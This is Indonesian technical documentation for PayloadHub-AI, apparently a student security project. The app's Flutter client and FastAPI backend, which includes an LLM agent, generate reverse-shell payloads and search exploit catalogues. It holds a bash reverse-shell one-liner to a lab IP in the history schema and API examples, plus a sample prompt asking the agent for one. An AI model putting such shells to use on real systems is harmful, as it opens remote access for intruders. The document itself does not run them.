# Dokumentasi Teknis — PayloadHub-AI

**Versi aplikasi:** 1.0.0+1
**Terakhir diperbarui:** 23 Oktober 2026
**Audiens:** pengembang, dosen pembimbing, dan penguji teknis.

Dokumen ini menjelaskan cara memasang, menjalankan, membangun, dan
memelihara PayloadHub-AI. Laporan tahapan proyek ada di
[`Tahap-1`](Tahap-1-Analisis-Kebutuhan.md) hingga
[`Tahap-5`](Tahap-5-Laporan-Akhir.md).

---

## 1. Gambaran Sistem

```text
┌──────────────────────────── Flutter client ────────────────────────────┐
│ Presentation : DashboardScreen, HistoryScreen, Settings, Exploit, ...  │
│ State        : Riverpod StateNotifier / Provider                        │
│ Domain       : ActivityEntry, ChatMessage, dashboard models             │
│ Data         : SecureActivityRepository, PayloadRepositoryImpl,         │
│                ThreatIntelService                                       │
│ Services     : SecureStorageService, DioClient, FreeChatbotService      │
└───────────────────────────────┬────────────────────────────────────────┘
                                │ HTTP/JSON (Dio)
                                ▼
┌──────────────────────────── FastAPI backend ───────────────────────────┐
│ /healthz                                                               │
│ /api/v1/agent/execute        → AgentExecutor + deterministic tools     │
│ /api/v1/exploitdb/search     → katalog ExploitDB                       │
│ /api/v1/virustotal/*         → status, scan, analysis, lookup          │
│ Validasi Pydantic + sanitasi teks + guardrail etika                    │
└────────────────────────────────────────────────────────────────────────┘
```

Prinsip desain:

1. **Deterministik lebih dulu.** Payload one-liner dibuat di klien tanpa
   memanggil LLM, sehingga tetap berfungsi saat backend mati.
2. **Validasi berlapis.** Klien memvalidasi IPv4/port; server memvalidasi
   ulang dengan Pydantic.
3. **Rahasia tidak pernah di bundle.** API key dimasukkan pengguna dan
   disimpan di secure storage.
4. **Kegagalan tidak mematikan aplikasi.** Data riwayat rusak diabaikan,
   error jaringan dipetakan menjadi pesan manusia.

## 2. Struktur Direktori

```text
frontend/
├── lib/
│   ├── main.dart
│   ├── core/
│   │   ├── error/app_exception.dart      # pemetaan error jaringan/API
│   │   ├── network/dio_client.dart       # konfigurasi Dio + timeout
│   │   ├── theme/app_theme.dart          # warna, tipografi, Material 3
│   │   └── utils/validators.dart         # IPv4, port, pesan error
│   ├── features/
│   │   ├── dashboard/
│   │   │   ├── data/threat_intel_service.dart
│   │   │   ├── domain/models/            # dashboard_models, exploit_models
│   │   │   └── presentation/
│   │   │       ├── dashboard_providers.dart
│   │   │       ├── dashboard_screen.dart
│   │   │       ├── controllers/          # navigation, generator, studio, ...
│   │   │       └── widgets/              # panel, halaman, top bar, sidebar
│   │   ├── history/
│   │   │   ├── domain/activity_entry.dart
│   │   │   ├── data/activity_repository.dart
│   │   │   └── presentation/             # controller, providers, screen
│   │   └── payload_chat/                 # entity, repository, model API
│   └── services/
│       ├── secure_storage_service.dart
│       ├── free_chatbot_service.dart
│       └── auto_key_loader.dart
├── test/                                 # 16 pengujian otomatis
└── android/                              # manifest + Gradle
backend/
└── app/                                  # main, models, agent, tools, ...
docs/                                     # laporan + aset
```

## 3. Prasyarat

| Komponen | Versi yang diuji | Catatan |
|---|---|---|
| Flutter | 3.47.2 stable | `flutter --version` |
| Dart | 3.13.2 | Mengikuti Flutter |
| JDK untuk Android | **OpenJDK 20.0.2** | JDK 25 gagal dengan Gradle 8.14 |
| Android SDK | 36.0.0, Build-Tools 35.0.0 | Platform 36 |
| Gradle | 8.14.3 | `android/gradle/wrapper/` |
| Android Gradle Plugin | 8.11.1 | `android/settings.gradle` |
| Kotlin | 2.2.20 | Minimum Flutter 3.47 |
| Python | 3.10+ | Backend |
| Node.js | Tidak diperlukan | — |

Konfigurasi JDK Flutter pada mesin build:

```powershell
flutter config --jdk-dir="C:\Program Files\Java\jdk-20"
flutter doctor -v
```

## 4. Instalasi

### 4.1 Backend

```powershell
cd backend
python -m venv .venv
.venv\Scripts\Activate.ps1
python -m pip install --upgrade pip
python -m pip install -r requirements.txt
Copy-Item .env.example .env
```

Isi `backend/.env`:

```dotenv
LLM_API_KEY=isi_key_anda
LLM_BASE_URL=https://api.deepseek.com
LLM_MODEL=deepseek-chat
LLM_TEMPERATURE=0.0
VIRUSTOTAL_API_KEY=
CORS_ALLOW_ORIGINS=http://localhost:3000,http://localhost:8080
```

Jalankan:

```powershell
uvicorn app.main:app --reload --host 0.0.0.0 --port 8000
```

Verifikasi:

```powershell
curl http://127.0.0.1:8000/healthz
# {"status":"ok"}
```

### 4.2 Frontend

```powershell
cd frontend
flutter pub get
flutter analyze
flutter test
```

Menjalankan pada target yang tersedia:

```powershell
flutter devices
flutter run -d windows
flutter run -d chrome
flutter run -d emulator-5554
```

## 5. Konfigurasi URL Backend

`defaultBaseUrl` ditentukan di
`lib/features/dashboard/presentation/dashboard_providers.dart`:

| Target | URL |
|---|---|
| Windows, Linux, macOS, Web | `http://localhost:8000` |
| Android Emulator | `http://10.0.2.2:8000` |
| Android fisik | IP LAN komputer, mis. `http://192.168.1.10:8000` |

Untuk perangkat fisik:

1. Jalankan backend dengan `--host 0.0.0.0`.
2. Izinkan port 8000 pada firewall.
3. Ubah `defaultBaseUrl` atau simpan URL kustom melalui Settings.
4. Untuk produksi gunakan HTTPS dan hapus `usesCleartextTraffic`.

> `usesCleartextTraffic="true"` hanya untuk lab lokal. Jangan dipakai pada
> distribusi publik.

## 6. Build Android

### 6.1 Perintah

```powershell
cd frontend
flutter clean          # opsional bila build cache bermasalah
flutter pub get
flutter analyze
flutter test
flutter build apk --release
```

Keluaran:

```text
build/app/outputs/flutter-apk/app-release.apk
```

Build final yang tercatat:

| Atribut | Nilai |
|---|---|
| Ukuran | 58.156.477 byte (55,5 MB) |
| SHA-256 | `302D47DEEB6A9AEAD3153173B1EC8431F94C97BCA61123D690A2267020EE5624` |
| applicationId | `id.farrel.payloadhubai` |
| minSdk | 21 |
| targetSdk | 36 |
| Izin | `INTERNET` |
| Aset rilis | <https://github.com/farrelfaiziaulhaq/payloadhub-ai/releases/tag/v1.0.0> |

### 6.2 Konfigurasi Gradle

`android/gradle/wrapper/gradle-wrapper.properties`:

```properties
distributionUrl=https\://services.gradle.org/distributions/gradle-8.14.3-all.zip
```

`android/settings.gradle`:

```groovy
plugins {
    id "dev.flutter.flutter-plugin-loader" version "1.0.0"
    id "com.android.application" version "8.11.1" apply false
    id "org.jetbrains.kotlin.android" version "2.2.20" apply false
}
```

`android/app/build.gradle`:

```groovy
android {
    namespace = "id.farrel.payloadhubai"
    compileSdk = flutter.compileSdkVersion

    defaultConfig {
        applicationId = "id.farrel.payloadhubai"
        minSdk = 21
        targetSdk = flutter.targetSdkVersion
        versionCode = flutter.versionCode
        versionName = flutter.versionName
    }

    buildTypes {
        release {
            signingConfig = signingConfigs.debug
        }
    }
}
```

> APK saat ini ditandatangani debug key. Untuk distribusi publik, buat
> keystore rilis dan `key.properties` (jangan commit).

### 6.3 Troubleshooting build

| Gejala | Penyebab | Solusi |
|---|---|---|
| `Gradle version 8.3.0 is lower than minimum 8.14.0` | Wrapper usang | Naikkan `distributionUrl` ke 8.14.3 |
| `Kotlin version 2.1.0 is lower than minimum 2.2.20` | KGP usang | Set Kotlin 2.2.20 |
| `Unsupported class file major version 69` | JDK 25 | Pakai JDK 20 |
| `Starting AGP 9+ ...` | AGP/DSL tidak cocok | Gunakan AGP 8.11.1 |
| Build lambat/kehabisan RAM | Gradle daemon + IDE | Tutup aplikasi berat; `gradle.properties` memakai memori terbatas |

## 7. Penyimpanan Lokal

`SecureStorageService` membungkus `FlutterSecureStorage` dengan
`AndroidOptions(encryptedSharedPreferences: true)`.

| Key | Isi | Sensitif |
|---|---|---|
| `llm_api_key` | API key LLM | Ya |
| `default_lhost`, `default_lport` | Prefill generator | Tidak |
| `backend_base_url` | URL backend kustom | Tidak |
| `api_openai`, `api_deepseek`, `api_gemini`, `api_shodan`, `api_virustotal` | Key provider | Ya |
| `llm_engine` | Pilihan engine | Tidak |
| `ui_glow`, `ui_terminal_font`, `ui_sound` | Preferensi UI | Tidak |
| `activity_log` | JSON array riwayat | Ya (berisi payload) |
| `free_chat_provider`, `free_chat_api_key` | Chatbot informasional | Ya |

### 7.1 Skema riwayat

```json
[
  {
    "id": "1729684800000000-payload",
    "kind": "payload",
    "title": "Reverse Shell — bash",
    "detail": "bash -i >& /dev/tcp/10.10.14.8/9001 0>&1",
    "createdAt": "2026-10-23T22:00:00.000"
  }
]
```

Aturan:

- `kind` ∈ `payload`, `exploit`, `scan`, `threat`, `chat`.
- Maksimum **40 entri**; entri tertua dibuang otomatis.
- Urutan menurun berdasarkan `createdAt`.
- Entri tidak valid dilewati saat pemuatan; JSON rusak menghasilkan daftar
  kosong, bukan crash.
- Ekspor menghasilkan JSON yang disalin ke clipboard.

## 8. Alur Data Utama

### 8.1 Generate payload

```text
ScriptGeneratorPage
  → Form.validate() (validators.dart)
  → ScriptGeneratorController.generate()
      → PayloadLibrary (deterministik)
      → HistoryController.add(ActivityEntry)
          → SecureActivityRepository.save()
              → SecureStorageService.writeActivityLog()
  → UI menampilkan kode + SnackBar + panel riwayat
```

### 8.2 Panggilan agent

```text
FreeChatController / Studio
  → PayloadRepositoryImpl.execute()
      → DioClient.post('/api/v1/agent/execute')
          → Pydantic validation
          → AgentExecutor (LLM + tools)
      ← AgentResponse { response, code_blocks, tools_used, elapsed_ms }
  → UI merender jawaban + blok kode
```

### 8.3 Riwayat

```text
HistoryController (StateNotifier<List<ActivityEntry>>)
  ├── load()   → repository.load()
  ├── add()    → insert(0) + trim(40) + persist
  ├── remove() → filter + persist
  ├── clear()  → [] + persist
  └── export() → jsonEncode + Clipboard
```

## 9. Kontrak API

### 9.1 `GET /healthz`

```json
{"status": "ok"}
```

### 9.2 `POST /api/v1/agent/execute`

Request:

```json
{
  "prompt": "Buat reverse shell bash untuk 10.10.14.8:9001",
  "session_id": "opsional-uuid",
  "context": {
    "lhost": "10.10.14.8",
    "lport": 9001,
    "target": "10.10.14.20",
    "target_os": "linux",
    "scan_data": "opsional teks Nmap/JWT"
  }
}
```

Response:

```json
{
  "status": "success",
  "session_id": "uuid",
  "response": "Penjelasan...",
  "code_blocks": [
    {"language": "bash", "code": "bash -i >& /dev/tcp/...", "payload_type": "reverse_shell"}
  ],
  "tools_used": ["generate_reverse_shell"],
  "elapsed_ms": 812
}
```

Validasi: `prompt` 1–4000 karakter, `lport` 1–65535, `lhost` IPv4,
`scan_data` dibatasi panjangnya dan disanitasi. Error validasi memakai
`ErrorResponse` terstruktur, bukan stack trace.

### 9.3 `GET /api/v1/exploitdb/search?q=...`

Mengembalikan katalog ExploitDB yang cocok. Query kosong/terlalu pendek
ditolak.

### 9.4 Endpoint VirusTotal

| Method | Path | Fungsi |
|---|---|---|
| GET | `/api/v1/virustotal/status` | Status konfigurasi key |
| POST | `/api/v1/virustotal/urls` | Scan URL |
| POST | `/api/v1/virustotal/files` | Upload file (batas ukuran) |
| GET | `/api/v1/virustotal/analyses/{id}` | Status analisis |
| GET | `/api/v1/virustotal/files/{hash}` | Laporan file |
| GET | `/api/v1/virustotal/url-report?url=` | Laporan URL |
| GET | `/api/v1/virustotal/domains/{domain}` | Laporan domain |
| GET | `/api/v1/virustotal/ips/{ip}` | Laporan IP |

Semua endpoint memerlukan `VIRUSTOTAL_API_KEY` (dari env atau header yang
diteruskan klien). Upload bersifat publik ke komunitas VirusTotal.

## 10. State Management dan Responsivitas

| Provider | Tipe | Tanggung jawab |
|---|---|---|
| `secureStorageProvider` | `Provider` | Singleton storage |
| `dioClientProvider` | `Provider` | Klien HTTP |
| `payloadRepositoryProvider` | `Provider` | Kontrak repository |
| `activityRepositoryProvider` | `Provider` | Riwayat terenkripsi |
| `historyControllerProvider` | `StateNotifierProvider` | Daftar riwayat |
| `navigationControllerProvider` | `StateNotifierProvider` | Halaman aktif |
| `scriptGeneratorControllerProvider` | `StateNotifierProvider` | Payload |
| `studioControllerProvider` | `StateNotifierProvider` | Konfigurasi studio |
| `telemetryControllerProvider` | `StateNotifierProvider` | Metrik monitoring |

Breakpoint:

| Lebar | Perilaku |
|---|---|
| `< 700 px` | Bottom navigation, `SafeArea`, padding 14 px, tanpa footer |
| `700–999 px` | Sidebar ringkas, dashboard satu kolom |
| `≥ 1000 px` | Sidebar penuh, dashboard tiga kolom, footer status |

Perubahan state memakai `ref.watch`; aksi memakai `ref.read(...notifier)`.
Controller tidak menyimpan `BuildContext`, sehingga dapat diuji tanpa widget.

## 11. Pengujian

```powershell
flutter analyze
flutter test
flutter test test/widget_test.dart --reporter expanded
```

| Berkas | Fokus |
|---|---|
| `validators_test.dart` | IPv4 valid/invalid, port, pesan error |
| `activity_history_test.dart` | JSON, data rusak, urutan, batas 40, kegagalan simpan |
| `widget_test.dart` | Desktop 1440×900, ponsel 390×844, navigasi, form, riwayat |
| `assets_test.dart` | Tidak ada kredensial ter-bundle |

Menambah test riwayat memakai fake repository:

```dart
class InMemoryActivityRepository implements ActivityRepository {
  List<ActivityEntry> entries = <ActivityEntry>[];

  @override
  Future<List<ActivityEntry>> load() async => List.of(entries);

  @override
  Future<void> save(List<ActivityEntry> value) async {
    entries = List.of(value);
  }
}
```

### 11.1 Membuat screenshot antarmuka

Screenshot pada laporan diambil dari build web yang berjalan, bukan mockup:

```powershell
cd frontend
flutter build web --release
python -m http.server 8099 --bind 127.0.0.1 --directory build/web
```

Buka `http://127.0.0.1:8099` dengan viewport **390 × 844**, lalu ambil
tangkapan layar Dashboard, Generator, Exploit, Riwayat, Settings, dan
Monitoring. Simpan sebagai PNG di `docs/assets/screenshots/`.

## 12. Keamanan

| Risiko | Mitigasi |
|---|---|
| API key bocor dari APK | Tidak ada key di `assets/`; key di secure storage |
| Riwayat berisi payload sensitif | Disimpan terenkripsi, bukan SharedPreferences |
| Input berbahaya | Validasi IPv4/port + sanitasi server |
| Penyalahgunaan | Peringatan etika di README, About, dan prompt agent |
| HTTP cleartext | Hanya diizinkan untuk lab; dokumentasi menyarankan HTTPS |
| Data rusak | Parser defensif; aplikasi tetap berjalan |

Yang **tidak** dijamin: keamanan perangkat yang sudah di-root, malware dengan
akses ke proses aplikasi, atau kebocoran melalui clipboard setelah pengguna
menyalin payload.

## 13. Troubleshooting

| Gejala | Pemeriksaan | Solusi |
|---|---|---|
| Aplikasi menampilkan error koneksi | `curl http://127.0.0.1:8000/healthz` | Jalankan Uvicorn; cek URL target |
| Android tidak terhubung | `flutter devices` | Emulator pakai `10.0.2.2`, fisik pakai IP LAN |
| `flutter test` gagal karena plugin | Fake repository terpasang? | Gunakan fake, jangan plugin native di unit test |
| Teks terpotong/overflow | Uji viewport 390 px | Gunakan `Expanded`/`Wrap`, bukan lebar tetap |
| Build APK gagal | `flutter doctor -v`, versi JDK | JDK 20 + Gradle 8.14.3 |
| Riwayat tidak muncul | Key `activity_log` ada? | Generate payload baru; cek log storage |
| Analyzer complaint | `dart fix --dry-run` | Perbaiki manual; jangan turunkan aturan lint |

## 14. Pemeliharaan

- Jalankan `flutter analyze` dan `flutter test` sebelum setiap commit.
- Perbarui `CHANGELOG`/README bila perilaku berubah.
- Jangan commit: `.env`, `key.properties`, `*.jks`, `build/`, `*.log`,
  `docx_dump.txt`.
- Untuk menambah jenis aktivitas baru: tambahkan nilai `ActivityKind`,
  label, dan pemanggilan `HistoryController.add`.
- Untuk mengganti backend: implementasikan `PayloadRepository` dan ganti
  provider; lapisan presentasi tidak perlu diubah.

## 15. Status Verifikasi

| Klaim | Status | Bukti |
|---|---|---|
| Analyzer bersih | **[C]** | `flutter analyze` |
| 16 test lulus | **[C]** | `flutter test` |
| APK build | **[C]** | Berkas + log build |
| Skema storage | **[C]** | `secure_storage_service.dart`, `activity_entry.dart` |
| Endpoint backend | **[C]** | `backend/app/main.py` |
| Instalasi perangkat fisik | **[S]** | Belum dicatat |
| Uji end-to-end dengan LLM key | **[S]** | Belum dijalankan penuh |

**VERDICT: approve** — dokumentasi teknis sesuai kode yang ada; dua butir
lapangan ditandai terbuka.
